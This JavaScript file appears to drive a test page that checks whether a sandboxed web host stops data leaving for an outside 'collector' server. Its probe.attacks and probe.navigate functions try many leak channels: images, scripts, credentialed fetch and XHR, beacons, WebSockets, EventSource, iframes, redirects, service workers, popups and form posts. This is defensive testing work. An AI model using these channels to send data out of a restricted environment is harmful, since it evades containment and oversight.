// The audition page. Driven runs load the page as ?run=NAME: it runs the
// probe and posts the result to its own handler's /api/report, as ordinary
// same-origin traffic, then performs any ?then= action. The host evaluates no
// JavaScript. Cross-origin attempts are judged by the collector's records,
// never by what the page sees.
"use strict";
const probe = {};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

probe.assets = () => ({
  origin: location.origin,
  css: getComputedStyle(document.body).backgroundColor === "rgb(30, 31, 36)",
  img: document.getElementById("logo").complete && document.getElementById("logo").naturalWidth === 24,
  cookie: document.cookie,
});

probe.checks = async () => {
  const q = await (await fetch("api/query?x=" + encodeURIComponent("é&ü"))).json();
  const body = "edit=" + "x".repeat(1000);
  const e = await (await fetch("api/echo", { method: "POST", body })).json();
  const missing = (await fetch("api/missing")).status;
  return { ...probe.assets(), query: q.x, echo: e, missing };
};

probe.stream = async () => {
  const r = await fetch("api/stream");
  const reader = r.body.getReader();
  const decoder = new TextDecoder();
  const chunks = [];
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    const text = decoder.decode(value);
    chunks.push(text);
    if (text.includes("chunk-1")) await fetch("api/stream-ack", { method: "POST" });
  }
  return { status: r.status, chunks };
};

probe.storageSet = (tag) => {
  document.cookie = "vis=" + tag + "; path=/";
  localStorage.setItem("k", tag);
  sessionStorage.setItem("k", tag);
  return probe.storageRead();
};
probe.storageRead = () => ({ cookie: document.cookie, local: localStorage.getItem("k"), session: sessionStorage.getItem("k") });
probe.cached = async () => {
  const r = await fetch("api/cached");
  return { count: r.headers.get("X-Count") };
};

// Requests aimed at the collector, and at another window's endpoint. The
// page's own view of success proves nothing.
probe.attacks = async (collector, other) => {
  const seen = {};
  const tryit = async (name, f) => { try { seen[name] = String(await f()); } catch (e) { seen[name] = "threw " + e.name; } };
  const add = (tag, attrs) => { const el = document.createElement(tag); Object.assign(el, attrs); document.body.appendChild(el); return el; };
  await tryit("img", () => { add("img", { src: collector + "/img" }); return "added"; });
  await tryit("script", () => { add("script", { src: collector + "/script" }); return "added"; });
  await tryit("css", () => { add("link", { rel: "stylesheet", href: collector + "/css" }); return "added"; });
  await tryit("fetch", async () => (await fetch(collector + "/fetch", { credentials: "include", mode: "no-cors" })).type);
  await tryit("xhr", () => new Promise((ok) => { const x = new XMLHttpRequest(); x.open("GET", collector + "/xhr"); x.withCredentials = true; x.onloadend = () => ok(x.status); x.send(); }));
  await tryit("beacon", () => navigator.sendBeacon(collector + "/beacon", "x"));
  await tryit("websocket", () => new Promise((ok) => { const w = new WebSocket(collector.replace("http", "ws") + "/ws"); w.onopen = () => ok("open"); w.onerror = () => ok("error"); setTimeout(() => ok("timeout"), 1500); }));
  await tryit("eventsource", () => new Promise((ok) => { const s = new EventSource(collector + "/sse"); s.onerror = () => { s.close(); ok("error"); }; setTimeout(() => { s.close(); ok("timeout"); }, 1500); }));
  await tryit("iframe", () => { add("iframe", { src: collector + "/iframe" }); return "added"; });
  await tryit("iframe-same", () => new Promise((ok) => { const f = add("iframe", { src: "api/query?x=frame" }); f.onload = () => ok("loaded"); setTimeout(() => ok("no load"), 1500); }));
  await tryit("redirect-img", () => { add("img", { src: "api/redirect-out?to=" + encodeURIComponent(collector + "/redirect-img") }); return "added"; });
  await tryit("redirect-fetch", async () => (await fetch("api/redirect-out?to=" + encodeURIComponent(collector + "/redirect-fetch"))).status);
  await tryit("worker", async () => { await navigator.serviceWorker.register("probe.js"); return "registered"; });
  if (other) await tryit("other-endpoint", async () => (await fetch(other + "/api/query?x=other", { credentials: "include" })).status);
  await sleep(2000);
  return seen;
};

// Navigation attempts end the page, so they run one at a time, after a report.
probe.navigate = (how, collector) => {
  switch (how) {
    case "location": location.href = collector + "/nav"; break;
    case "redirect": location.href = "api/redirect-out?to=" + encodeURIComponent(collector + "/redirect-nav"); break;
    case "popup": window.open(collector + "/popup"); break;
    case "form": { const f = document.createElement("form"); f.method = "post"; f.action = collector + "/form"; document.body.appendChild(f); f.submit(); break; }
  }
};

probe.runs = {
  checks: () => probe.checks(),
  stream: () => probe.stream(),
  storageSet: (q) => probe.storageSet(q.get("tag")),
  storageRead: () => probe.storageRead(),
  cached: () => probe.cached(),
  attacks: (q) => probe.attacks(q.get("collector"), q.get("other") || ""),
  hold: () => { fetch("api/hold"); return "started"; },
  upload: () => { fetch("api/echo", { method: "POST", body: "u".repeat(900000) }); return "started"; },
  armed: () => "armed",
};
probe.then = {
  navigate: (q) => probe.navigate(q.get("how"), q.get("collector")),
  go: (q) => { location.href = q.get("to"); },
  submit: (q) => { const f = document.getElementById("edit"); f.action = q.get("action"); f.submit(); },
};
probe.report = (body) => fetch("api/report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });

addEventListener("load", async () => {
  const q = new URLSearchParams(location.search);
  const run = q.get("run");
  if (!run) return;
  const report = { id: q.get("id") || run, run, href: location.href };
  try { report.result = await probe.runs[run](q); } catch (e) { report.error = String(e); }
  await probe.report(report);
  if (q.get("then")) probe.then[q.get("then")](q);
});

addEventListener("DOMContentLoaded", () => {
  document.getElementById("origin").textContent = location.origin;
  document.getElementById("assets").textContent = probe.assets().css ? "stylesheet loaded" : "no stylesheet";
  const log = (v) => { document.getElementById("log").textContent = JSON.stringify(v, null, 2); };
  document.getElementById("checks").onclick = async () => log(await probe.checks());
  document.getElementById("stream").onclick = async () => log(await probe.stream());
  document.getElementById("outside").onclick = () => { location.href = "https://example.com/"; };
  document.getElementById("popup").onclick = () => { log(String(window.open("https://example.com/"))); };
});
